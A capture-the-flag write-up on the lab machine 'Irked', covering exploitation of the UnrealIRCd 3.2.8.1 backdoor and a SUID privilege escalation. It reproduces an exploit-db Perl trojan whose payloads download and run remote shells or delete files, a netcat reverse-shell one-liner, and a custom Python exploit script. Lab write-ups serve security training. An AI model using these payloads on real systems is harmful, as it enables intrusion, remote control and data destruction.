# Irked
Irked is a Linux machine that rated as easy. You will learn some Linux Enumeration and exploit modification.

# Recon
We start with nmap scan:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ nmap -sC -sV 10.10.10.117
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 14:20 EDT
Nmap scan report for 10.10.10.117
Host is up (0.031s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44786/udp6  status
|   100024  1          51369/udp   status
|   100024  1          58446/tcp   status
|_  100024  1          59755/tcp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.43 seconds
```

Also nmap full scan reveal more things:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ nmap -sV -p-  10.10.10.117                                                                                                                                                                                                   148 ⨯ 1 ⚙
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 14:30 EDT
Nmap scan report for 10.10.10.117
Host is up (0.032s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
58446/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds
```

### RPC

For RPC I didn't find any thing mounted. You can check that using the command ```showmount```:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ sudo showmount -e 10.10.10.117
[sudo] password for kali: 
clnt_create: RPC: Program not registered
```

### IRCD

So If we go to web page we see this message: ```IRC is almost working!```.

![image1]()

We can find the version of IRCD using ```irssi```:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ sudo irssi -c 10.10.10.117 --port 8067
```

![image2]()

From the image above we can see that it is running ```Unreal 3.2.8.1```


## Searchsploit

**searchsploit** shows many some intrested exploits:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ searchsploit Unreal 3.2.8.1
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                                                             | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                                                                  | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                                                                           | linux/remote/13853.pl
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

So we can get a shell using **Metasploit**, but I got some comments to do things without Metasploit. Let's check the last exploit **13853.pl**:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ cat /usr/share/exploitdb/exploits/linux/remote/13853.pl                                                                                                                                                                            1 ⚙
#!/usr/bin/perl
# Unreal3.2.8.1 Remote Downloader/Execute Trojan
# DO NOT DISTRIBUTE -PRIVATE-
# -iHaq (2l8)

use Socket;
use IO::Socket;

## Payload options
my $payload1 = 'AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &';
my $payload2 = 'AB; cd /tmp; wget http://efnetbs.webs.com/bot.txt -O bot; chmod +x bot; ./bot &';
my $payload3 = 'AB; cd /tmp; wget http://efnetbs.webs.com/r.txt -O rshell; chmod +x rshell; ./rshell &';
my $payload4 = 'AB; killall ircd';
my $payload5 = 'AB; cd ~; /bin/rm -fr ~/*;/bin/rm -fr *';

$host = "";
$port = "";
$type = "";
$host = @ARGV[0];
$port = @ARGV[1];
$type = @ARGV[2];

if ($host eq "") { usage(); }
if ($port eq "") { usage(); }
if ($type eq "") { usage(); }

sub usage {
  printf "\nUsage :\n";
  printf "perl unrealpwn.pl <host> <port> <type>\n\n";
  printf "Command list :\n";
  printf "[1] - Perl Bindshell\n";
  printf "[2] - Perl Reverse Shell\n";
  printf "[3] - Perl Bot\n";
  printf "-----------------------------\n";
  printf "[4] - shutdown ircserver\n";
  printf "[5] - delete ircserver\n";
  exit(1);
}

sub unreal_trojan {
  my $ircserv = $host;
  my $ircport = $port;
  my $sockd = IO::Socket::INET->new (PeerAddr => $ircserv, PeerPort => $ircport, Proto => "tcp") || die "Failed to connect to $ircserv on $ircport ...\n\n";
  print "[+] Payload sent ...\n";
  if ($type eq "1") {
    print $sockd "$payload1";
  } elsif ($type eq "2") {
    print $sockd "$payload2";
  } elsif ($type eq "3") {
    print $sockd "$payload3";
  } elsif ($type eq "4") {
    print $sockd "$payload4";
  } elsif ($type eq "5") {
    print $sockd "$payload5";
  } else {
    printf "\nInvalid Option ...\n\n";
    usage();
  }
  close($sockd);
  exit(1);
}

unreal_trojan();
# EOF
```

From what I can see it connect to the box and then send **AB** and after it the command that we wants to run. We can confirm that like this:

1. Open Wireshark and make it start capturing

2. Now connect to the Box using **nc** and make it ping to your ip address:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ nc 10.10.10.117 6697                                                                                                                                                                                                           1 ⨯ 1 ⚙
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB; ping -c 3 10.10.14.27
:irked.htb 451 AB; :You have not registered
```

As you can see from the image below we can see the ping request:

![image3]()

# User Flag

Start a listener and then run this command after you connect using **nc**:

```AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.27 4444 >/tmp/f```

And we got our shell:
```
(pwncat-env) ┌──(kali㉿kali)-[~/Desktop/pwncat]
└─$ pwncat --listen -p 4444 
[14:49:04] received connection from 10.10.10.117:41876  
[14:49:05] new host w/ hash 8d781d61aaae7e813fe928fc1939cb38
[14:49:07] pwncat running in /bin/bash 
[14:49:08] pwncat is ready 🐈                                                                                                                                                                                                                                                               
(remote) ircd@irked:/$ id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

So we can see where is the user.txt file located, but we can't access it. there is also a **.backup** in the same place, let's check it out:

```
(remote) ircd@irked:/home/djmardov/Documents$ file .backup
.backup: ASCII text
(remote) ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

So the only image we have is the **http** image let's check it:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ wget 10.10.10.117/irked.jpg                                                                                                                                                                                                        1 ⚙
--2020-09-20 14:54:10--  http://10.10.10.117/irked.jpg
Connecting to 10.10.10.117:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34697 (34K) [image/jpeg]
Saving to: ‘irked.jpg’

irked.jpg                                                  100%[=======================================================================================================================================>]  33.88K  --.-KB/s    in 0.04s   

2020-09-20 14:54:11 (903 KB/s) - ‘irked.jpg’ saved [34697/34697]
```

Now we can use **steghide**:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss  

wrote extracted data to "pass.txt".
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ cat pass.txt    

Kab6h+m+bbp2J:HG
```

## ssh
We can ssh now using the pasword we have:

```
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ ssh djmardov@10.10.10.117
The authenticity of host '10.10.10.117 (10.10.10.117)' can't be established.
ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.117' (ECDSA) to the list of known hosts.
djmardov@10.10.10.117's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

Get the User Flag:

```
djmardov@irked:~/Documents$ cat user.txt 
4a66a78b12dc0e661a59d3f5c0267a8e
```

# Root Flag

Upload [LinEnum.sh](https://github.com/rebootuser/LinEnum "LinEnum.sh") to the box and run it. You will find something in the **SUID files** section:

```
[-] SUID files:
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount
```

**/usr/bin/viewuser** looks intresting. Let's see what it does:

```
djmardov@irked:~/Documents$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-20 14:21 (:0)
djmardov pts/1        2020-09-20 14:59 (10.10.14.27)
sh: 1: /tmp/listusers: not found
```

So **sh** is trying to run **/tmp/listusers**, but it can't because listusers is not found, let's create one and put in it the command **id**.

```
djmardov@irked:~/Documents$ echo "id" > /tmp/listusers
djmardov@irked:~/Documents$ chmod +x /tmp/listusers
```

Now let's run **/usr/bin/viewuser** again:
```
djmardov@irked:~/Documents$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-20 14:21 (:0)
djmardov pts/1        2020-09-20 14:59 (10.10.14.27)
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

As we can see we are root, let's now drop a shell as root:

```
djmardov@irked:~/Documents$ echo sh > /tmp/listusers 
djmardov@irked:~/Documents$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-20 14:21 (:0)
djmardov pts/1        2020-09-20 14:59 (10.10.14.27)
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

We have a root shell now, get the root flag:

```
# cat root.txt
8d8e9e8be64654b6dccc3bff4522daf3
```

# Advance

So for the shell you can create a simple python script to get a shell:

```python
#!/usr/bin/env python3

import socket
import subprocess
import sys
import time

if len(sys.argv) != 5:
  print(f"Usage: {sys.argv[0]} [RHOST] [RPORT] [LHOST] [LPORT]")
  sys.exit()

RHOST, RPORT, LHOST, LPORT = sys.argv[1:]

print(f"[+] Connecting to {RHOST}:{RPORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((RHOST, int(RPORT)))
except:
  print(f"[-] Error connecting to {RHOST}:{RPORT}")
  sys.exit(1)
s.recv(1000)

time.sleep(10)

print("[+] Sending the payload")
s.send(f"AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f\n".encode())
s.close()
print("[+] Payload sent")

print("[!] Make sure to run the listener")

print("[+] Exit!")
```

Here is how to use it:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ chmod +x exploit.py

┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ ./exploit.py                                    
Usage: ./exploit.py [RHOST] [RPORT] [LHOST] [LPORT]
```

Exploit:

1. Run a listener
```
(pwncat-env) ┌──(kali㉿kali)-[~/Desktop/pwncat]
└─$ pwncat --listen -p 4444
```

2. Exploit it ;)

```
┌──(kali㉿kali)-[~/Desktop/HTB/Irked]
└─$ ./exploit.py 10.10.10.117 6697 10.10.14.27 4444
[+] Connecting to 10.10.10.117:6697
[+] Sending the payload
[+] Payload sent
[!] Make sure to run the listener
[+] Exit!
```
It will take less than one minute to get a shell.

```
(pwncat-env) ┌──(kali㉿kali)-[~/Desktop/pwncat]
└─$ pwncat --listen -p 4444 
[19:35:27] received connection from 10.10.10.117:35653
[19:35:28] new host w/ hash 24bfeaa0a16a65c4545f02b822626231
[19:35:30] pwncat running in /bin/bash
[19:35:31] pwncat is ready 🐈
                                                                                                                                                                                                                                            
(remote) ircd@irked:/$ id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots

If you need help with the code just PM me on twitter ;)
